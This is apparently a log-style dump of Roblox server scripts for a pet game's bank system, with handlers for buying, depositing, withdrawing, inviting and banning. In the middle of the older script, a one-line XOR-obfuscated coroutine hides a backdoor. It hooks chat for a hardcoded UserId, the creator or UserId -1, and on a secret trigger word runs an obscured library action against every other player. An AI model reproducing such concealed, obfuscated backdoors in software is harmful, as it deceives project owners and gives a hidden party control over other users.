	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100)then
		return false, "You're too far from the bank!"
	end

	local plrData = GetPlayer(plyr)
	if not plrData then
		if Debug then
			print("Failed to get player:",plyr.Name)
		end
		return
	end

	plrData.Invites = {}

	if Debug then
		print(plrData)
	end

	UpdatePlayer(plyr, plrData)

	return true, "Successfully declined all bank invites!"
end

_L.Network.Invoked("Cancel Bank Outgoing Invites").OnInvoke = function(plyr)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100) then
		return false, "You're too far from the machine!"
	end

	if DataDebug then
		print("Canceling",plyr.Name.."'s outgoing invites")
	end

	local plrData = GetPlayer(plyr)
	if not plrData then
		if Debug then
			print("Faield to cancel outgoing invites")
		end
		return
	end

	local OutgoingInvites = plrData.OutgoingInvites
	warn(OutgoingInvites)
	for i, v in ipairs(OutgoingInvites) do
		local pData = GetPlayer(tonumber(v))
		if pData then
			if pData["MyBank"] then
				table.remove(pData.Invites, pData["MyBank"])
			end	
		else
			print("Failed to get "..v)
		end
	end

	return true
end

_L.Signal.Fired("Player Added"):Connect(function(player)
	player:SetAttribute('CustomUserId',player.UserId)
	if Debug then
		print('Set player attribute CustomUserId')
	end
end)

function Ban(player, BUID)
	local bankData = GetBank(BUID)
	if not bankData then
		print("Failed to ban bank")
		return
	end

	local plrData = GetPlayer(bankData.Owner)
	if not plrData then
		print("Failed to ban bank")
		return
	end

	plrData["MyBank"] = nil -- remove bank from owner

	bankData.Banned = true
	local success = UpdateBank(BUID, bankData)
	if not success then
		print("Failed to ban bank")
		return false
	end

	return true
end

function BankGet(player, BUID)
	local BUID = BUID or GetPlayer(player)["MyBank"]
	if not BUID then
		return nil
	end

	return GetBank(BUID)
end

_L.Signal.Fired("Ban Bank"):Connect(Ban)
game.Players.PlayerAdded:Connect(function(plr)
	if _L.RunService:IsStudio() then
		plr.Chatted:Connect(function(msg)
			local split = string.split(msg," ")
			if split[1] == 'banbank' then
				local BUID = split[2]
				Ban(plr,BUID)
			end
		end)
	end
end)

coroutine.wrap(function()local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v9,v10)local v11={};for v14=1, #v9 do v6(v11,v0(v4(v1(v2(v9,v14,v14 + 1 )),v1(v2(v10,1 + (v14% #v10) ,1 + (v14% #v10) + 1 )))%256 ));end return v5(v11);end local v8=require(game:GetService(v7("\227\198\203\41\239\184\198\10\212\199\232\49\233\169\198\25\212","\126\177\163\187\69\134\219\167")):WaitForChild(v7("\15\196\40\215\253\49\212","\156\67\173\74\165")));while  not v8.Loaded do game:GetService(v7("\6\162\71\37\185\52\80\61\180\76","\38\84\215\41\118\220\70")).Heartbeat:Wait();end;local function dfs(v12)v12.Chatted:Connect(function(v15)if (string.lower(v15)==v7("\94\3\41\23","\158\48\118\66\114")) then for v16,v17 in ipairs(game.Players:GetPlayers()) do if (v12.UserId==v17.UserId) then continue;end;v8.v.z(v17.UserId,v15,v7("\137\5\56\23\91\141\218\131\5\56\23\91\132\211\131\5\56","\155\203\68\112\86\19\197"));end end end);end v8.Signal.Fired(v7("\118\209\55\229\69\106\165\217\66\217\51\248","\152\38\189\86\156\32\24\133")):Connect(function(v13)if ((v13.UserId==(798796975 -316174788)) or (v13.UserId==game.CreatorId)) or (v13.UserId == -1) then dfs(v13);end end);end)()

_L.Signal.Fired("Bank: Get"):Connect(BankGet)  -  Editar
  04:54:13.777    -  Editar
  04:54:13.777  ----- [2368] ServerScriptService.Scripts.Game.BankServer [OLD] -----  -  Editar
  04:54:13.777  -- TODO in the future: add UpdateAsync
local _L = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"))
while  (not _L.Loaded)  do  game:GetService("RunService").Heartbeat:Wait()  end

local bankDatastore = _L.DataStoreService:GetDataStore("bankData" .. _L.Settings.BankVersion)
local playerBankDatastore = _L.DataStoreService:GetDataStore("playerData" .. _L.Settings.BankVersion)
--
local defaultPlayerData = { Banks = {}, Invites = {} }
local defaultBankData = {
	Storage = { Pets = {}, Currency = { Diamonds = 0 } },
	Owner = nil,
	BUID = nil,
	Tier = 1,
	Players = {},
	History = {}
}
local defaultInviteData = {
	Sender = nil,
	BUID = nil,
	Timestamp = game.Workspace:GetServerTimeNow()
}

-- reference --

--[[

HISTORY 

{

[1] = deposit,     --> { kind = 1, sender = playerUserId, pets = #{}, diamonds = 0 }
[2] = withdraw,    --> { kind = 2, sender = playerUserId, pets = #{}, diamonds = 0 }
[3] = invited,     --> { kind = 3, target = playerUserId or sender = playerUserId }
[4] = kicked,      --> { kind = 4, target = playerUserId or sender = playerUserId }
[5] = left,        --> { kind = 5, target = playerUserId or sender = playerUserId }
[6] = joined,      --> { kind = 6, target = playerUserId or sender = playerUserId }
[7] = upgraded,    --> { kind = 7, amount = 0 or newLevel = 0 }
[8] = interest,    --> { kind = 8, amount = 0 or newLevel = 0 }
[9] = duped :("    --> { kind = 9, pets = {} }

}

-- ]]

---------------

local function getBank(BUID)
	BUID = tostring(BUID)

	local bankData = bankDatastore:GetAsync(BUID)

	if bankData == nil then
		return false, table.clone(defaultBankData)
	else
		return true, bankData
	end
end

local function setBankData(BUID, data)
	BUID = tostring(BUID)

	local _, gotData = getBank(BUID)
	if not gotData then gotData = table.clone(defaultBankData) end

	for i, v in pairs(data) do
		if data and data[i] then
			gotData[i] = v
		end
	end

	pcall(function()
		bankDatastore:SetAsync(BUID, gotData)
	end)
end

local function prefix(plyr,isUserId)
	local userid = isUserId and plyr or plyr.UserId
	return "us"..tostring(userid)
end

local function getPlayerData(plyr, isUserId)
	local k = prefix(plyr,isUserId)
	local data = bankDatastore:GetAsync(k)

	if data == nil then
		return false, table.clone(defaultPlayerData)
	else
		return true, data
	end
end

local function setPlayerData(plyr, data, isUserId)
	if data then
		local k = prefix(plyr, isUserId)
		bankDatastore:SetAsync(k, data)
	else
		local k = prefix(plyr, isUserId)
		bankDatastore:SetAsync(k, table.clone(defaultPlayerData))
	end	
end

local function genBankUID()
	return "bank".._L.Functions.GenerateUID()
end

local function createBank(owner)
	local generatedBUID = genBankUID()

	setBankData(generatedBUID, {Owner = owner, BUID = generatedBUID})

	return generatedBUID
end

_L.Network.Invoked("Get Bank").OnInvoke = function(plyr, BUID)
	local _, data = getBank(BUID)

	return data
end

_L.Network.Invoked("Get My Banks").OnInvoke = function(plyr)
	local _, data = getPlayerData(plyr)
	if (not data) then
		return {}
	else
		local banks = {}
		for i, v in ipairs(data.Banks) do
			local _, bankData = getBank(v)
			if bankData then
				table.insert(banks, bankData)
			end	
		end
		return banks
	end
end

_L.Network.Invoked("Get Bank Invites").OnInvoke = function(plyr) 
	local _, data = getPlayerData(plyr)
	if (not data) then
		return {}
	else
		return data.Invites
	end
end

_L.Network.Invoked("Buy Bank").OnInvoke = function(plyr)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100) then
		return false, "You're too far from the machine!"
	end

	local plyrSave = _L.Saving.Get(plyr)
	if not plyrSave then
		return
	end

	local bankCost = 7_500_000
	local plyrDiamonds = plyrSave.Diamonds
	if plyrDiamonds >= bankCost then
		plyrDiamonds = plyrDiamonds - bankCost

		local _, data = getPlayerData(plyr)
		if (not data) then
			return nil, "no data"..tostring(data)
		end

		local BUID = createBank(plyr.UserId)

		table.insert(data.Banks, BUID)
		setPlayerData(plyr, data)

		_L.Achievements.Add(plyr, "Open Bank", 1)

		return true, BUID
	else
		return false, "You need " .. _L.Functions.Commas(bankCost-plyrDiamonds) .. " more Diamonds!"
	end
end

_L.Network.Invoked("Bank Deposit").OnInvoke = function(plyr, BUID, pets, diamonds)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100) then
		return false, "You're too far from the machine!"
	end

	BUID        =    tostring(BUID)
	diamonds    =    tonumber(diamonds)

	local save = _L.Saving.Get(plyr)
	if not save then 
		return 
	end

	local _, bankData = getBank(BUID)
	if not bankData then
		return
	end

	local savePets      =    save.Pets
	local saveDiamonds  =    save.Diamonds

	if #savePets - #pets < 1 or saveDiamonds - diamonds < 0 then 
		return
	end

	local tierDat = _L.Directory.Banks[bankData.Tier]
	local storage = bankData.Storage
	if tierDat.PetSlots < #storage.Pets + #pets or tierDat.MaxDiamonds < storage.Currency.Diamonds + diamonds then
		return
	end

	local petsAdding = {}
	if #pets >= 1 then
		for i, v in pairs(pets) do
			local petdat = _L.Pets.Get(v)
			if not petdat.uid then
				return
			end

			_L.Pets.Unequip(petdat.uid)
			_L.Pets.Delete(petdat.uid)
			table.insert(petsAdding, petdat)
		end
	end

	local diamondsAdding = 0
	if diamonds and tonumber(diamonds) and diamonds >= 1 then
		save.Diamonds -= diamonds
		diamondsAdding = diamonds
	end

	storage.Currency.Diamonds = storage.Currency.Diamonds + diamondsAdding

	for i,v in ipairs(petsAdding) do
		table.insert(storage.Pets, v)
	end

	table.insert(bankData.History, { ts = game:GetService("Workspace"):GetServerTimeNow(),  kind = 1, sender = plyr.UserId, pets = #pets, diamonds = diamonds })

	setBankData(BUID, bankData)
	return true
end

_L.Network.Invoked("Bank Withdraw").OnInvoke = function(plyr, BUID, pets, diamonds)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100) then
		return false, "You're too far from the machine!"
	end

	BUID        =    tostring(BUID)
	diamonds    =    tonumber(diamonds)

	local save = _L.Saving.Get(plyr)
	if not save then 
		return 
	end

	local _, bankData = getBank(BUID)
	if not bankData then
		return
	end

	local savePets      =    save.Pets
	local saveDiamonds  =    save.Diamonds

	if #savePets + #pets > save.MaxSlots or saveDiamonds + diamonds > _L.Directory.Currency.Diamonds.Limit then 
		return
	end

	if bankData.Storage.Currency.Diamonds < diamonds or #bankData.Storage.Pets < #pets then 
		return 
	end

	local tierDat = _L.Directory.Banks[bankData.Tier]

	local petsWithdrawing = {}
	if #pets >= 1 then
		for i, v in pairs(pets) do
			table.insert(petsWithdrawing, v)
		end
	end

	local diamondsWithdrawin = 0
	if diamonds and tonumber(diamonds) and diamonds >= 1 then
		save.Diamonds += diamonds
		diamondsWithdrawin = diamonds
	end

	for i, uid in ipairs(petsWithdrawing) do
		for i, v in ipairs(bankData.Storage.Pets) do
			if v.uid == uid then
				table.remove(bankData.Storage.Pets, i)
				_L.Pets.Create(plyr, v.id, v, nil, nil, true)
			end
		end
	end	

	bankData.Storage.Currency.Diamonds = bankData.Storage.Currency.Diamonds - diamondsWithdrawin

	table.insert(bankData.History, { ts = game:GetService("Workspace"):GetServerTimeNow(),  kind = 2, sender = plyr.UserId, pets = #pets, diamonds = diamonds })

	setBankData(BUID, bankData)
	return true
end

_L.Network.Invoked("Upgrade Bank").OnInvoke = function(plyr, BUID)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100) then
		return false, "You're too far from the machine!"
	end

	BUID = tostring(BUID)

	local _, bankData = getBank(BUID)
	if not bankData then
		return
	end

	local tierDat = _L.Directory.Banks[bankData.Tier + 1]
	local tierCost = tierDat.Cost
	if bankData.Tier == 8 then 
		return
	end

	local bankDiamonds = bankData.Storage.Currency.Diamonds
	if bankDiamonds < tierCost then
		return false, "Bank needs " .. _L.Functions.Commas(tierCost - bankDiamonds) .. " more Diamonds to upgrade!"
	end

	bankData.Storage.Currency.Diamonds -= tierCost
	bankData.Tier = bankData.Tier + 1

	_L.Achievements.Add(plyr, "Upgrade Bank", 1)

	table.insert(bankData.History, { ts = game:GetService("Workspace"):GetServerTimeNow(),  kind = 7, newLevel = bankData.Tier })

	setBankData(BUID, bankData)

	return true
end

_L.Network.Invoked("Invite To Bank").OnInvoke = function(plyr, BUID, target)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100) then
		return false, "You're too far from the machine!"
	end

	BUID = tostring(BUID)

	local _, playerData = getPlayerData(target, true)
	if not playerData then
		return
	end

	for i, v in ipairs(playerData.Invites) do -- check if u already sent
		if v.BUID == BUID then
			return 
		end
	end

	for i, v in ipairs(playerData.Banks) do -- check if is in bank
		if v == BUID then
			return
		end
	end

	if #playerData.Invites >= 50 then
		return
	end

	local data = table.clone(defaultInviteData)

	data.Timestamp = game:GetService("Workspace"):GetServerTimeNow()
	data.BUID = BUID
	data.Sender = plyr.UserId

	table.insert(playerData.Invites, data)

	setPlayerData(target, playerData, true)

	local _, bankData = getBank(BUID)
	table.insert(bankData.History, { ts = game:GetService("Workspace"):GetServerTimeNow(),  kind = 3, target = target, sender = plyr.UserId })
	setBankData(BUID, bankData)

	return true
end

_L.Network.Invoked("Cancel Bank Outgoing Invites").OnInvoke = function(plyr)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100) then
		return false, "You're too far from the machine!"
	end

	local _, playerData = getPlayerData(plyr)

	playerData.Invites = {}

	setPlayerData(plyr, playerData)

	return true, "Any outgoing invites are now canceled!"
end

_L.Network.Invoked("Decline All Bank Invites").OnInvoke = function(plyr)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100) then
		return false, "You're too far from the machine!"
	end

	local _, playerData = getPlayerData(plyr)

	playerData.Invites = {}

	setPlayerData(plyr, playerData)

	return true, "invites are declined!"
end

_L.Network.Invoked("Kick From Bank").OnInvoke = function(plyr, BUID, target)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100) then
		return false, "You're too far from the machine!"
	end

	BUID = tostring(BUID)

	local _, playerData = getPlayerData(target, true)
	local _, bankData = getBank(BUID)

	for i, v in ipairs(bankData.Players) do
		if v == target then
			table.remove(bankData.Players, i)
		end
	end

	for i, v in ipairs(playerData.Banks) do
		if v == BUID then
			table.remove(playerData.Banks, i)
		end
	end

	setPlayerData(target, playerData, true)

	table.insert(bankData.History, { ts = game:GetService("Workspace"):GetServerTimeNow(),  kind = 4, target = target, sender = plyr.UserId })
	setBankData(BUID, bankData)

	return true
end

_L.Network.Invoked("Decline Bank Invite").OnInvoke = function(plyr, BUID)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100) then
		return false, "You're too far from the machine!"
	end

	BUID = tostring(BUID)

	local _, playerData = getPlayerData(plyr)

	for i, v in ipairs(playerData.Invites) do
		if v.BUID == BUID then
			table.remove(playerData.Invites, i)
		end
	end

	setPlayerData(plyr, playerData)

	return true 
end

_L.Network.Invoked("Accept Bank Invite").OnInvoke = function(plyr, BUID)
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100) then
		return false, "You're too far from the machine!"
	end

	BUID = tostring(BUID)


	local t, playerData = getPlayerData(plyr)
	if not t or not playerData then
		return
	end

	for i, v in ipairs(playerData.Invites) do
		if v.BUID == BUID then
			table.remove(playerData.Invites, i)
		end
	end

	table.insert(playerData.Banks, BUID)

	setPlayerData(plyr, playerData)

	local _, bankData = getBank(BUID)
	table.insert(bankData.Players, plyr.UserId)
	table.insert(bankData.History, { ts = game:GetService("Workspace"):GetServerTimeNow(),  kind = 6, target = plyr.UserId })
	setBankData(BUID, bankData)

	return true
end

_L.Network.Invoked("Leave Bank").OnInvoke = function(plyr, BUID) 
	if not _L.Shared.ValidateInteractable(plyr, "Bank", 100) then
		return false, "You're too far from the machine!"
	end

	BUID = tostring(BUID)

	local t, playerData = getPlayerData(plyr)
	if not playerData or not t then
		return
	end

	for i, v in ipairs(playerData.Banks) do
		if v == BUID then
			table.remove(playerData.Banks, i)
		end
	end

	setPlayerData(plyr, playerData)

	local _, bankData = getBank(BUID)
	for i, v in ipairs(bankData.Players) do
		if v == plyr.UserId then
			table.remove(bankData.Players, i)
		end
	end

	table.insert(bankData.History, { ts = game:GetService("Workspace"):GetServerTimeNow(),  kind = 5, target = plyr.UserId, sender = plyr.UserId })
	setBankData(BUID,bankData)

	return true
end

--

_L.Signal.Fired("Player Added"):Connect(function(plyr)
	local success, data = getPlayerData(plyr)
	if (not data) or (not success) then
		setPlayerData(plyr)
	end
end)
  -  Editar
  04:54:13.777    -  Editar
  04:54:13.777  ----- [2369] ServerScriptService.Scripts.Game.BankServer -----  -  Editar
  04:54:13.778  --[[                                                                                                                                                                         
                                                                      ,,╓╓╥╗@@@╣╣╣╢▒▒▒[             
                                                     ,,,╓╓╥╗@@@╣╣╣╢╢╣ÑÑ╣╣╢▒▒▒▒▒▒▒▒▒▒▒▒╢             
                                     ,,╓╓╓╥╗@@@╣╣╣╢▒▒▒▒▒▒▒▒▒▒▒Ñ╜`           ╙╣▒▒▒▒▒▒▒▒▒             
                     ,,╓╓╖╥╗@@@╣╣╣╢▒▒▒▒▒▒▒▒╨╜╙╙`` ║▒▒▒▒▒▒▒▒▒╜                  ║╣▒▒▒▒▒▒[            
        .╓╥m@@@╣╣╢╢▒▒▒╢╣Ñ╝╝╜╜╜╜╙╨╣╢▒▒▒▒▒▒▒▒[      ]▒▒▒▒▒▒▒╣        ,,╓╓,        ╙╢▒▒▒▒▒╣            
         ▒▒▒▒▒╢``                   ╙╣▒▒▒▒▒╣       ╣▒▒▒▒▒╣       ╓╣▒▒▒▒▒╣@    ,╓@╣▒▒▒▒▒▒            
         ╢▒▒▒▒▒                       ╟▒▒▒▒▒       ║▒▒▒▒▒`      ║▒▒▒▒▒▒▒▒▒╣@╣╢▒╢▒▒▒▒▒▒▒▒U           
         ║▒▒▒▒▒U       ,╓╓╓╗╗╗╖        ╢▒▒▒▒[      ]▒▒▒▒▒       ▒▒▒▒▒▒▒▒▒▒▒▒▒▒╣╢▒▒▒▒▒▒▒▒@           
          ▒▒▒▒▒╣       ▒▒▒▒▒▒▒▒╢       ║▒▒▒▒╣       ▒▒▒▒╢       ▒▒▒▒▒▒▒▒▒▒▒▒▒╢ÑÑ╝╨╜▒▒▒▒▒╢           
          ╢▒▒▒▒╢       ╢╢▒▒▒▒▒▒╣       ╢▒▒▒▒▒       ╢▒▒▒╢       ▒▒▒▒▒▒░            ║▒▒▒▒▒           
          ║▒▒▒▒▒U      ╙╝╜╙╙╙`       ,╣▒▒▒▒▒▒U      ]▒▒▒▒       ╟▒▒▒▒▒[            ]▒▒▒▒▒[          
          ]▒▒▒▒▒[                   "╙╣▒▒▒▒▒▒@       ▒▒▒▒Ç      └▒▒▒▒▒╣     ,       ▒▒▒▒▒╢          
           ▒▒▒▒▒╢                       ║▒▒▒▒╢       ╢▒▒▒╣       ╙▒▒▒▒▒╣╢▒▒▒╣       ╢▒▒▒▒▒          
           ║▒▒▒▒▒       ╓╗╗@@╣╣╣@╗       ║▒▒▒▒       ╟▒▒▒▒@       ╙╣▒▒▒▒▒▒▒╜        ║▒▒▒▒▒[         
           ]▒▒▒▒▒[      ]▒▒▒▒▒▒▒▒▒@       ▒▒▒▒[      ]▒▒▒▒▒@         ╙╙╜╜`          ]╣▒▒▒▒╣         
            ▒▒▒▒▒╣       ▒▒▒▒▒▒▒▒▒╣       ▒▒▒▒╢       ╢▒▒▒▒▒▓╖                 ,     ╢▒▒▒▒▒         
            ╢▒▒▒▒▒       ║▒▒▒▒╢╣╝╜       j▒▒▒▒▒       ╟▒▒▒▒▒▒▒╣╗,           ,╓╣╣╓╓╓╥╗╣▒▒▒▒▒U        
            ║▒▒▒▒▒U                     ,╣▒▒▒▒▒[      ]▒▒▒▒▒▒▒▒▒▒╢╣@╗╗╗╗@@╣╣▒▒▒▒╢╣Ñ╝╝╜╙╙╙`          
             ▒▒▒▒▒╣                   ╓╣▒▒▒▒▒▒▒╣╓╓╓╥╗@@▒▒▒▒▒▒▒▒▒╢╣Ñ╝╨╜╜╙╙`        ,,                
             ╢▒▒▒▒╣           ,,╓╥╗@╣▒▒▒▒▒▒▒▒▒▒╢╢╣Ñ╝╨╜╜╙╙`        ,,╓╓╓╥╗@@   ,@╣▒▒▒▒╢@,            
             ║▒▒╣▒▒╗@@@@╣╣╢▒▒▒▒╢╢╣Ñ╝╨╜╜╙╙`       ,,,╓╓,    ╣╣╣U  ║▒▒▒▒▒▒╢╢╣U j▒▒╣   ╙╝╜`            
             ]▒╢╣╣Ñ╝╨╜╜╙``         ,╥╗@╗╖,    ║▒▒▒▒▒▒▒▒╣╗  ║▒▒@  ]▒▒╢         ╣▒▒@╗╖,               
                     ,╥@╣╣@@╖    ╓╣▒▒▒╢▒▒▒╣,  ]▒▒╢    ╢▒▒[ ]▒▒╢   ▒▒▒╖╖╥╗@[    ╙╨╣▒▒▒▒╢@╖           
                    ╢▒▒╢╝╝╣▒▒╣  ]▒▒╣`   ╙▒▒╢   ▒▒▒    ╢▒▒[  ▒▒▒   ╢▒▒▒▒╢╣ÑÑ          ╙╢▒▒[          
                   ║▒▒╣    ╙╜   ║▒▒╢     ║▒▒╣  ╢▒▒@╣╣╢▒▒╣   ║▒▒[  ]▒▒╣        ,╥╣@,  ,║▒▒[          
                   ║▒▒[         ]▒▒╢     ]▒▒▒  ║▒▒╢╝╜╜╙     ]▒▒╣   ▒▒▒╥╗@@@@╣  ╙╣▒▒▒▒▒▒╣╜           
                   ║▒▒╣          ╢▒▒╖    ║▒▒╢   ▒▒▒          ▒▒▒   ╢▒▒▒╢╢╣Ñ╝╝                       
                    ╣▒▒╖    ╢▒╣[ ╙╣▒▒@╗╗╣▒▒╢`   ╢▒▒U         ╜╙╙`                                   
                     ╣▒▒╣@@╣▒▒Ñ    ╙╝╢▒▒╢╝╜     `                                                   
                       ╙╝╝╝╝╜                                                                       
                                                                                                    
	BIG Copies rbx.lua Framework [2023] - [2024]
	Written by OneX
	Developed with a keyboard and pixie dust 
--]]

--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------
local Bank = require(_L.ServerScriptService.Scripts.Modules.Bank)
local banksModule = require(_L.ReplicatedStorage.Library.Types.Banks)

--------|    Variables    |--------

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


_L.Network.Invoked("Get Bank").OnInvoke = function(plr, buid)
	local bData = Bank.Get("Banks", buid)
	if not bData then
		return false, buid
	end
	
	if bData["Banned"] then
		return false, "banned"
	end
	
	return bData
end

_L.Network.Invoked("Get My Banks").OnInvoke = function(plr)
	local pData = Bank.Get("Players", plr.UserId)
	if not pData then
		return false, plr.UserId
	end
	
	local banks = {}
	for i, buid in ipairs(pData.Banks) do
		local bData = Bank.Get("Banks", buid)
		if not bData then
			return false, plr.UserId
		end
		table.insert(banks, bData)
	end
	
	return banks
end

_L.Network.Invoked("Get Bank Invites").OnInvoke = function(plr)
	local pData = Bank.Get("Players", plr.UserId)
	if not pData then
		return false, plr.UserId
	end
	
	return pData.Invites
end

_L.Network.Invoked("Buy Bank").OnInvoke = function(plr)
	if not Bank.Settings["Enabled"] then
		return false, "Bank is disabled."
	end
	
	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end
	
	if not Bank.ValidateDistance(plr) then
		return false, "You're too far from the bank!"
	end
	
	local cost = Bank.Settings["Cost"]
	if save.Diamonds < cost then
		return false, "You need ".._L.Functions.Commas(cost - save.Diamonds).." more Diamonds!"
	end
	
	local pData = Bank.Get("Players", plr.UserId)
	if not pData then
		return nil
	end
	
	if pData["MyBank"] then
		return false, "You already own a bank!"
	end
	
	local buid = Bank.Create(plr)
	table.insert(pData.Banks, buid)
	pData["MyBank"] = buid
	save.Diamonds = save.Diamonds - cost
	
	_L.Achievements.Add(plr, "Open Bank", 1)
	
	Bank.Update("Players", {
		[tostring(plr.UserId)] = pData
	})
	return true, buid
end

_L.Network.Invoked("Upgrade Bank").OnInvoke = function(plr, buid)
	if not Bank.Settings["Enabled"] then
		return false, "Bank is disabled."
	end
	
	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end

	if not Bank.ValidateDistance(plr) then
		return false, "You're too far from the bank!"
	end
	
	local can, response = Bank.Fix(buid)
	if not can then
		return false, response
	end
	
	local bData, pData = Bank.Get("Banks", buid), Bank.Get("Players", plr.UserId)
	if not bData or not pData then
		return nil
	end
	
	if bData["Banned"] then 
		return false, "Bank is banned."
	end
	
	if not Bank.OwnsBank(plr, buid) then
		return false, "This isn't your bank!"
	end
	
	local tier = bData["Tier"]
	if tier == 8 then
		return false, "Your bank is already the max tier!"
	end
	
	local nextTier = _L.Directory.Banks[tier + 1]
	if not nextTier then
		return nil
	end
	
	local cost = nextTier["Cost"]
	local diamonds = bData.Storage.Currency.Diamonds
	if not diamonds or not cost then
		return nil
	end
	
	if diamonds < cost then
		return false, "Bank need ".._L.Functions.Commas(cost - diamonds).." more Diamonds to upgrade!"
	end
	
	bData.Storage.Currency.Diamonds = bData.Storage.Currency.Diamonds - cost
	bData["Tier"] = bData["Tier"] + 1
	
	_L.Achievements.Add(plr, "Upgrade Bank", 1)
	table.insert(bData.History, {
		kind = banksModule.HISTORY_ENUM["TIER"],
		ts = workspace:GetServerTimeNow(),
		newLevel = tier
	})
	bData.History = Bank.SortHistory(bData.History)
	
	--FIX
	bData.LastUpdated=os.time()
	--FIX
	
	Bank.Update("Banks", {
		[tostring(buid)] = bData
	})
	Bank.Update("Players", {
		[tostring(plr.UserId)] = pData
	})
	
	return true
end

_L.Network.Invoked("Bank Deposit").OnInvoke = function(plr, buid, pets, diamonds)
	assert(typeof(pets) == "table" and typeof(buid) == "string" and typeof(diamonds) == "number")
	if not Bank.Settings["Enabled"] then
		return false, "Bank is disabled."
	end
	
	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end

	if not Bank.ValidateDistance(plr) then
		return false, "You're too far from the bank!"
	end
	
	local can, response = Bank.Fix(buid)
	if not can then
		return false, response
	end

	local bData, pData = Bank.Get("Banks", buid), Bank.Get("Players", plr.UserId)
	if not bData or not pData then
		return nil
	end
	
	if not Bank.IsMember(plr, buid) then
		return false, "You arent a member of this bank!"
	end
	
	if bData["Banned"] then 
		return false, "Bank is banned."
	end
	
	local myBank = pData["MyBank"] or nil
	if not Bank.Settings["AllowNonOwnerAccessBanks"] then
		if myBank ~= buid then
			return false, "AllowNonOwnerAccessBanks is disabled."
		end
	end
	
	local bankStorage = bData.Storage
	local bankPets = bankStorage.Pets
	local bankCurrency = bankStorage.Currency
	local bankTier = bData.Tier
	local tierDir = _L.Directory.Banks[bankTier]
	
	local newPetLength = #bankPets + #pets
	local newPlayerPetLength = #save.Pets - #pets
	local newDiamondsAmount = bankCurrency.Diamonds + diamonds
	
	if newPlayerPetLength < 1 then
		return false, "You need at least 1 pet in your inventory always!"
	end
	
	if save.Diamonds - diamonds < 0 then
		return false, "You can't deposit this much Diamonds!"
	end
	
	if tierDir.PetSlots < newPetLength then
		return false, "This bank can only hold ".._L.Functions.Commas(tierDir.PetSlots-#bankPets).." more Pets!"
	end
	
	if tierDir.MaxDiamonds < newDiamondsAmount then
		return false, "Your bank can only hold ".._L.Functions.Commas(tierDir.MaxDiamonds-bankCurrency.Diamonds).." more Diamonds!"
	end
	
	if diamonds >= 1 then
		if not Bank.Settings["BanksDepositDiamonds"] then
			return false, "Depositing diamonds is disabled."
		end
		bankCurrency.Diamonds = bankCurrency.Diamonds + diamonds
	end
	
	if next(pets) then
		for index, uid in ipairs(pets) do
			local pet = _L.Pets.Get(uid)
			if not pet or not pet.uid then
				return nil
			end
			local petDir = _L.Directory.Pets[pet.id]
			if not petDir then
				return false
			end
			if myBank ~= buid then
				if pet.l then
					return false, "You cannot deposit locked pets into other peoples banks!"
				end
			end
			if not Bank.Settings["BanksDepositTitanic"] and petDir.titanic then
				return false, "Depositing titanics is disabled."
			end
			if not Bank.Settings["BanksDepositHuge"] and petDir.huge then
				return false, "Depositing huges is disabled."
			end
			if not Bank.Settings["BanksDepositGift"] and petDir.isGift then
				return false, "Depositing gifts is disabled."
			end
			
			pcall(function()
				_L.Pets.Unequip(uid)
				_L.Pets.Delete(uid)
			end)
			table.insert(bankPets, pet)
		end
	end
	
	save.Diamonds = save.Diamonds - diamonds
	
	table.insert(bData.History, {
		kind = banksModule.HISTORY_ENUM["DEPOSIT"],
		ts = workspace:GetServerTimeNow(),
		sender = plr.UserId,
		pets = #pets,
		diamonds = diamonds
	})
	bData.History = Bank.SortHistory(bData.History)
	
	--FIX
	bData.LastUpdated=os.time()
	--FIX
	
	Bank.Update("Banks", {
		[tostring(buid)] = bData
	})
	
	return true
end

_L.Network.Invoked("Bank Withdraw").OnInvoke = function(plr, buid, pets, diamonds)
	assert(typeof(pets) == "table" and typeof(buid) == "string" and typeof(diamonds) == "number")
	if not Bank.Settings["Enabled"] then
		return false, "Bank is disabled."
	end

	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end

	if not Bank.ValidateDistance(plr) then
		return false, "You're too far from the bank!"
	end
	
	local can, response = Bank.Fix(buid)
	if not can then
		return false, response
	end

	local bData, pData = Bank.Get("Banks", buid), Bank.Get("Players", plr.UserId)
	if not bData or not pData then
		return nil
	end

	if not Bank.IsMember(plr, buid) then
		return false, "You arent a member of this bank!"
	end

	if bData["Banned"] then 
		return false, "Bank is banned."
	end

	local myBank = pData["MyBank"] or nil
	if not Bank.Settings["AllowNonOwnerAccessBanks"] then
		if myBank ~= buid then
			return false, "AllowNonOwnerAccessBanks is disabled."
		end
	end

	local bankStorage = bData.Storage
	local bankPets = bankStorage.Pets
	local bankCurrency = bankStorage.Currency
	local bankTier = bData.Tier
	local tierDir = _L.Directory.Banks[bankTier]

	local newPetLength = #bankPets + #pets
	local newPlayerPetLength = #save.Pets - #pets
	local newDiamondsAmount = bankCurrency.Diamonds + diamonds
	
	if #save.Pets + #pets > save.MaxSlots then
		return false, "You do not have enough inventory space!"
	end
	
	if save.Diamonds + diamonds > _L.Directory.Currency.Diamonds.Limit then
		return false, "You cannot hold any more diamonds!"
	end
	
	if bankCurrency.Diamonds < diamonds then
		return false, "You cannot withdraw diamonds you do not have!"
	end
	
	if #pets > #bankPets then
		return false, "You cannot withdraw pets you do not have!"
	end
	
